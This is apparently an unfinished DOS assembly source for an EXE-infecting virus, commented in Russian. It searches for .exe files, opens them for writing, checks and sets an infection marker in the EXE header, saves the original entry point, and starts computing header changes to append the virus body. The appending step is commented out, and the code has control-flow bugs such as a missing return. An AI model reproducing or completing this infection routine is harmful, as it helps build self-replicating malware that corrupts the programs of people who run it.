.model small
.stack 100h
.code
start:

    ; установка ds
    push cs
    pop ds

    ; поиск .exe файла

    ; устанвока dta на file
    mov ah, 1ah
    lea dx, file
    int 21h

    ; поиск первого фала
    lea dx, file_mask
    mov ah, 4eh
    int 21h
    jmp file_open

find_next:
    ; поиск следующего файла
    mov ah, 3eh
    int 21h
    mov ah, 4fh
    int 21h

file_open:
    ; открытие файла (дескриптор файла -> ax)
    lea dx, file.f_name
    mov ax, 3D02h
    int 21h
    mov bx, ax ; дескриптор файла (ax) -> bx
    jc find_next ; обрабокта ошибки открытия

    ; чтение exe-заголовка
    mov ah,03fh
    mov cx,1Ah
    lea dx,header
    int 21h

    ; проверка на заражение
    cmp header[13h], 69h
    jz find_next

    ; сохранение дескриптора
    mov file_descriptor, bx

    ; сохранение ip и cs
    mov ax, word ptr header[14h]
    mov old_ip, ax
    mov ax, word ptr header[16h]
    mov old_cs, ax

    call calculate_header

    ; закрытие файла
    mov ah, 3eh
    int 21h

    ; PAYLOAD BEGIN

    lea dx, file.f_name
    call str_f2c
    mov ah, 09h
    int 21h

    ; PAYLOAD END

    ; выход из программы
    mov ah, 4ch
    int 21h

procedures:

    ; процедура рассчета новый значений заголовка
    calculate_header proc
        ; сохранение регистров в стек
        push ax
        push bx
        push cx
        push dx

        ; метка заражения
        mov header[13h], 69h

        ; размер файла
        mov ax, word ptr file.f_size[0]
        mov dx, word ptr file.f_size[2]

        ; округление младшей части до границы параграфа
        or ax,0000Fh
        inc ax
        adc dx,0
        ; add ax, vir_len
        ; adc dx, 0
        ; mov word ptr file.f_size[0], ax
        ; mov word ptr file.f_size[2], dx



        ; восстановление регистров из стека
        pop dx
        pop cx
        pop bx
        pop ax
    calculate_header endp

    ; процедура реформатирования строки для работы с файлами в строку для вывода на консоль
    str_f2c proc
        push cx
        push bx
        mov cx, 13
        str_f2c_lp:
        mov bx, dx
        add bx, 13
        sub bx, cx
        cmp byte ptr[bx], 0
        jz str_f2c_ch
        loop str_f2c_lp
        str_f2c_popret:
        pop bx
        pop cx
        ret
        str_f2c_ch:
        mov byte ptr[bx], '$'
        jmp str_f2c_popret
    str_f2c endp

    ; процедура реформатирования строки для вывода на консоль в строку для работы с файлами
    str_c2f proc
        push cx
        push bx
        mov cx, 13
        str_c2f_lp:
        mov bx, dx
        add bx, 13
        sub bx, cx
        cmp byte ptr[bx], '$'
        jz str_c2f_ch
        loop str_c2f_lp
        str_c2f_popret:
        pop bx
        pop cx
        ret
        str_c2f_ch:
        mov byte ptr[bx], 0
        jmp str_c2f_popret
    str_c2f endp

data:
    ; структура файла в буфере dta
    DTAFileInfo struc
        f_reserved db 21 dup(?)
        f_attr db ?
        f_time dw ?
        f_date dw ?
        f_size dd ?
        f_name db 13 dup(?)
    ends

    ExeHeader struc
        x_signature dw ?
        x_size_l dw ?
        x_size_h dw ?
        x_addr_table_size dw ?
        x_title_size dw ?
        x_min_pars_for_boot dw ?
        x_max_pars_for_boot dw ?
        x_stack_offset dw ?
        x_sp_init dw ?
        x_check_sum dw ?
        x_ip_init dw ?
        x_cs_offset dw ?
        x_addrs_setup_offset dw ?
        x_is_overlay dw ?
        x_dynamic_addrs_table dw ?
    ends

    file DTAFileInfo <>
    vir_len equ offset vir_end - offset start
    file_descriptor dw, ?
    file_mask db '*.exe*', 0
    header ExeHeader <>

    inserting_data:
    old_ip dw, ?
    old_cs dw, ?

vir_end:
end start